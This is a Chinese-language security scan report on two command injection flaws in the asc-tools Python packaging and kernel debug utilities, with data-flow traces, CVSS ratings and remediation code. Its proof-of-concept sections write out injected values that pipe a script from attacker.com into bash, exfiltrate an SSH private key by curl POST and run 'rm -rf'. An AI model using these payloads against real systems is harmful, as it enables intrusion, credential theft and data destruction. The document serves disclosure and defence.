# 漏洞扫描报告 - asc-tools

**项目**: asc-tools (AscendC 开发工具框架)
**扫描时间**: 2026-04-23T01:53:50.828Z
**报告范围**: CONFIRMED 状态漏洞

---

## 执行摘要

本次安全扫描在 asc-tools 项目中发现 **2 个已确认的 Critical 级别命令注入漏洞**。这两个漏洞均源于 Python 代码中使用 `subprocess.run(shell=True)` 配合 f-string 格式化字符串拼接用户可控输入，攻击者可通过注入 shell 元字符（如 `;`, `$()`, 反引号等）执行任意系统命令。

### 关键发现

| 漏洞类型 | 数量 | 最高严重性 |
|----------|------|------------|
| 命令注入 (CWE-78) | 2 | Critical |

**风险评估**:
- 两个漏洞均可导致任意代码执行，在 CI/CD 或开发环境中可能导致供应链攻击
- 攻击复杂度低，无需特殊条件即可触发
- 受影响模块为打包工具和内核调试数据解析工具，属于高频使用场景

### 修复紧急度

| 优先级 | 漏洞ID | 模块 | 状态 |
|--------|--------|------|------|
| P0 (立即修复) | VULN-DF-PY-001 | scripts/package | Critical 命令注入 |
| P0 (立即修复) | VULN-DF-PY-002 | show_kernel_debug_data | Critical 命令注入 |

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| LIKELY | 3 | 30.0% |
| FALSE_POSITIVE | 3 | 30.0% |
| POSSIBLE | 2 | 20.0% |
| CONFIRMED | 2 | 20.0% |
| **总计** | **10** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 2 | 100.0% |
| **有效漏洞总计** | **2** | - |
| 误报 (FALSE_POSITIVE) | 3 | - |

---

## 2. 攻击面分析

### 入口点识别

项目为开发工具框架，主要入口点包括：

1. **CLI 工具入口**
   - `scripts/package/package.py` - 打包工具，通过 argparse 接收 `--delivery_dir` 参数
   - `show_kernel_debug_data` - 内核调试数据解析工具，通过 `sys.argv` 接收 bin 文件路径

2. **外部数据输入**
   - 用户提供的 CLI 参数直接进入命令拼接
   - 文件路径参数来自用户输入，未经安全验证

### 攻击路径

```
[CLI 参数输入] → [参数传递] → [f-string 拼接] → [subprocess.run(shell=True)]
     ↑                                            ↓
  可控输入                                    命令注入触发点
```

---

## 3. Top 2 Critical 漏洞深度分析

### [VULN-DF-PY-001] packer.py 命令注入

#### 漏洞详情

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-PY-001 |
| **类型** | 命令注入 (Command Injection) |
| **CWE** | CWE-78 |
| **严重性** | Critical |
| **置信度** | 85/100 |
| **文件** | `scripts/package/common/py/packer.py:204-214` |
| **函数** | `exec_pack_cmd` |

#### 源代码分析

**漏洞代码片段**:

```python
def exec_pack_cmd(delivery_dir: str,
                 pack_cmd: str,
                 package_name: str) -> str: 
    """执行打包命令"""
    if delivery_dir:
        cmd = f'cd {delivery_dir} && {pack_cmd}'  # ← f-string 拼接
    else:
        cmd = pack_cmd
    CommLog.cilog_info("package cmd:%s", cmd)
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)  # ← shell=True
```

**数据流追踪**:

```
package.py:args_parse() [SOURCE]
    ↓ --delivery_dir 参数 (line 777-778)
package.py:main() (line 673-674)
    ↓ delivery_dir = main_args.delivery_dir
package.py:get_compress_cmd() (line 53-71)
    ↓ exec_pack_cmd(delivery_dir, pack_cmd, ...)
packer.py:exec_pack_cmd() [SINK]
    ↓ cmd = f'cd {delivery_dir} && {pack_cmd}'
    ↓ subprocess.run(cmd, shell=True)
```

**关键问题**:
- `delivery_dir` 直接来自 CLI 参数 `--delivery_dir`，未经任何验证
- f-string 拼接将用户输入直接嵌入 shell 命令
- `shell=True` 启用 shell 解析，允许元字符执行

#### 可利用性分析

**攻击向量**: 通过 CI/CD 流水线或构建脚本注入恶意参数

**PoC 示例**:

```bash
# 在构建环境中注入命令
python scripts/package/package.py \
    --pkg_name firmware \
    --delivery_dir "/tmp/x; curl http://attacker.com/backdoor.sh | bash; #/tmp/x" \
    --independent_pkg

# 实际执行的命令:
# cd /tmp/x; curl http://attacker.com/backdoor.sh | bash; #/tmp/x && {pack_cmd}
```

**CVSS 3.1 评分**: 8.8 (High)

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector | Local | 需本地执行脚本 |
| Attack Complexity | Low | 无需特殊条件 |
| Privileges Required | Low | 需调用打包脚本权限 |
| User Interaction | None | 无需交互 |
| Scope | Changed | 可影响其他组件 |
| CIA Impact | High/High/High | 完整性、可用性、机密性全高 |

#### 影响范围

- **供应链风险**: 若构建产物被分发，恶意代码可植入最终产品
- **CI/CD 提权**: 构建服务账户通常具有较高权限
- **数据泄露**: 可读取构建服务器上的敏感文件（密钥、配置等）

---

### [VULN-DF-PY-002] dump_parser.py 命令注入

#### 漏洞详情

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-DF-PY-002 |
| **类型** | 命令注入 (Command Injection) |
| **CWE** | CWE-78 |
| **严重性** | Critical |
| **置信度** | 85/100 |
| **文件** | `utils/show_kernel_debug_data/show_kernel_debug_data/dump_parser.py:861-876` |
| **函数** | `DumpBinFile._pre_process` |

#### 源代码分析

**漏洞代码片段**:

```python
def _pre_process(self, dump_bin: str):
    dump_dir = os.path.dirname(dump_bin)
    temp_dir = os.path.join(dump_dir, "predump")
    dump_file_name = os.path.basename(dump_bin)
    install_path = get_install_path()
    search_re = f"{install_path}/**/operator_cmp/compare/msaccucmp.py"
    search_result = glob.glob(search_re, recursive=True)
    if not search_result or not os.path.exists(search_result[0]):
        return dump_bin
    msaccucmp_file = os.path.realpath(search_result[0])
    cmd = f"python3 {msaccucmp_file} convert -d {dump_bin} -t bin -out {temp_dir}"  # ← f-string
    log_file_tmp = DUMP_PARSER_LOG.get_log_file()
    with open(log_file_tmp, "a+") as f:
        try:
            process = subprocess.run(cmd, stdout=f, stderr=subprocess.STDOUT, 
                                     shell=True, encoding='utf-8', timeout=120)  # ← shell=True
        except subprocess.TimeoutExpired as e:
            DUMP_PARSER_LOG.error(f'Command {cmd} TIME OUT.')
```

**数据流追踪**:

```
__main__.py:execute_parse() [SOURCE]
    ↓ sys.argv[1] → bin_file_path (line 1172)
dump_parser.py:execute_parse() (line 1161-1209)
    ↓ bin_file_path → parse_dump_bin(dump_bins[0], ...)
dump_parser.py:DumpBinFile.__init__() (line 856-859)
    ↓ self.dump_bin = self._pre_process(dump_bin)
dump_parser.py:DumpBinFile._pre_process() [SINK]
    ↓ cmd = f"python3 {msaccucmp_file} convert -d {dump_bin} ..."
    ↓ subprocess.run(cmd, shell=True)
```

**关键问题**:
- `dump_bin` 来自 `sys.argv[1]`，直接接收 CLI 输入
- 虽然有 `os.path.exists()` 检查，但检查本身会失败于特殊路径名
- f-string + shell=True 组合允许完整命令注入

#### 可利用性分析

**攻击向量**: 通过恶意文件名或 CLI 参数注入

**PoC 示例**:

```bash
# 创建恶意文件名
touch "/tmp/dump.bin; cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com; #"

# 用户 unknowingly 解析该文件
show_kernel_debug_data "/tmp/dump.bin; cat ~/.ssh/id_rsa | curl -X POST -d @- http://attacker.com; #"
```

**批量处理场景风险**:

```bash
# 批量处理脚本中的漏洞利用
for f in $(find /data -name "*.bin"); do
    show_kernel_debug_data "$f" /output
done

# 如果 /data 中存在恶意命名文件:
# /data/dump.bin; rm -rf /important_data
# 则脚本会执行删除命令
```

**CVSS 3.1 评分**: 7.8 (High)

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector | Local | 需本地执行脚本 |
| Attack Complexity | Low | 无需特殊条件 |
| Privileges Required | Low | 需调用解析工具 |
| User Interaction | Required | 需用户执行脚本或处理恶意文件 |
| Scope | Changed | 可影响其他组件 |
| CIA Impact | High/High/High | 完整性、可用性、机密性全高 |

#### 影响范围

- **开发环境入侵**: 该工具用于 NPU 内核调试，常在开发服务器使用
- **SSH 密钥泄露**: 可窃取开发者 SSH 密钥
- **横向移动**: 作为内网渗透入口点

---

## 4. 敏感信息暴露分析

### 潜在敏感数据暴露风险

基于漏洞分析，以下敏感信息可能被攻击者获取：

| 数据类型 | 风险场景 | 潜在影响 |
|----------|----------|----------|
| SSH 密钥 | `~/.ssh/id_rsa` | 远程服务器访问 |
| 环境变量 | `$AWS_SECRET_KEY`, `$ASCEND_*` | 云服务凭证泄露 |
| 构建配置 | `/etc/shadow`, 服务账户密钥 | 权限提升 |
| 项目源代码 | Git 仓库访问 | IP 知识产权泄露 |
| CI/CD 密钥 | Jenkins/GitLab token | 供应链攻击入口 |

### 已识别的敏感路径

通过代码分析，以下路径可能在攻击中被访问：

1. **VULN-DF-PY-001 (打包工具)**:
   - 构建服务器文件系统完全可访问
   - CI/CD 环境变量可被注入命令读取
   - 构建产物可被篡改植入恶意代码

2. **VULN-DF-PY-002 (调试工具)**:
   - 开发者 home 目录可访问
   - SSH 配置和密钥可被窃取
   - 项目配置文件可被读取

---

## 5. 修复建议 (优先级排序)

### P0 - 立即修复 (Critical 漏洞)

#### [VULN-DF-PY-001] packer.py 修复方案

**推荐方案**: 使用列表形式执行命令，移除 `shell=True`

```python
def exec_pack_cmd(delivery_dir: str,
                  pack_cmd_list: List[str],
                  package_name: str) -> str:
    """执行打包命令"""
    CommLog.cilog_info("package cmd:%s", pack_cmd_list)
    result = subprocess.run(
        pack_cmd_list,
        cwd=delivery_dir,  # 使用 cwd 参数替代 cd 命令
        check=False,
        stdout=PIPE,
        stderr=STDOUT
    )
    output = result.stdout.decode()
    if result.returncode != 0:
        CommLog.cilog_error(__file__, "compress package(%s) failed! %s.", package_name, output)
        raise CompressError(package_name)
    return package_name
```

**配套修改**: 将 `compose_makeself_command` 改为返回命令列表而非字符串

**临时缓解方案**: 使用 `shlex.quote()` 对 `delivery_dir` 进行转义

```python
import shlex

def exec_pack_cmd(delivery_dir: str, pack_cmd: str, package_name: str) -> str:
    if delivery_dir:
        safe_delivery_dir = shlex.quote(delivery_dir)
        cmd = f'cd {safe_delivery_dir} && {pack_cmd}'
    else:
        cmd = pack_cmd
    result = subprocess.run(cmd, shell=True, check=False, stdout=PIPE, stderr=STDOUT)
```

#### [VULN-DF-PY-002] dump_parser.py 修复方案

**推荐方案**: 使用列表形式执行命令

```python
def _pre_process(self, dump_bin: str):
    dump_dir = os.path.dirname(dump_bin)
    temp_dir = os.path.join(dump_dir, "predump")
    dump_file_name = os.path.basename(dump_bin)
    install_path = get_install_path()
    search_re = f"{install_path}/**/operator_cmp/compare/msaccucmp.py"
    search_result = glob.glob(search_re, recursive=True)
    if not search_result or not os.path.exists(search_result[0]):
        return dump_bin
    msaccucmp_file = os.path.realpath(search_result[0])
    
    # 使用列表形式，移除 shell=True
    cmd = [
        "python3",
        msaccucmp_file,
        "convert",
        "-d",
        dump_bin,
        "-t",
        "bin",
        "-out",
        temp_dir
    ]
    
    log_file_tmp = DUMP_PARSER_LOG.get_log_file()
    with open(log_file_tmp, "a+") as f:
        try:
            process = subprocess.run(
                cmd,
                stdout=f,
                stderr=subprocess.STDOUT,
                encoding='utf-8',
                timeout=120
            )
        except subprocess.TimeoutExpired as e:
            DUMP_PARSER_LOG.error('Command timed out')
```

**附加验证**: 添加路径输入验证

```python
def validate_dump_bin_path(dump_bin: str) -> str:
    """验证 dump_bin 路径安全性"""
    if not dump_bin:
        raise ValueError("dump_bin path is empty")
    
    # 检查 shell 元字符
    dangerous_chars = [';', '|', '&', '$', '`', '(', ')', '<', '>', '\n', '\r']
    for char in dangerous_chars:
        if char in dump_bin:
            raise ValueError(f"Invalid character in path: '{char}'")
    
    abs_path = os.path.abspath(dump_bin)
    if not os.path.exists(abs_path):
        raise ValueError(f"Path does not exist: {abs_path}")
    
    return abs_path
```

---

## 6. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| scripts/package | 1 | 0 | 0 | 0 | 1 |
| show_kernel_debug_data | 1 | 0 | 0 | 0 | 1 |
| **合计** | **2** | **0** | **0** | **0** | **2** |

---

## 7. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-78 (OS Command Injection) | 2 | 100.0% |

---

## 8. 参考资源

1. **CWE-78**: https://cwe.mitre.org/data/definitions/78.html
2. **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
3. **Python subprocess 安全最佳实践**: https://docs.python.org/3/library/subprocess.html#security-considerations
4. **shlex.quote 文档**: https://docs.python.org/3/library/shlex.html#shlex.quote

---

## 附录: 详细分析报告

完整的漏洞分析报告已生成于 `{SCAN_OUTPUT}/details/` 目录:
- `VULN-DF-PY-001.md`: packer.py 命令注入详细分析
- `VULN-DF-PY-002.md`: dump_parser.py 命令注入详细分析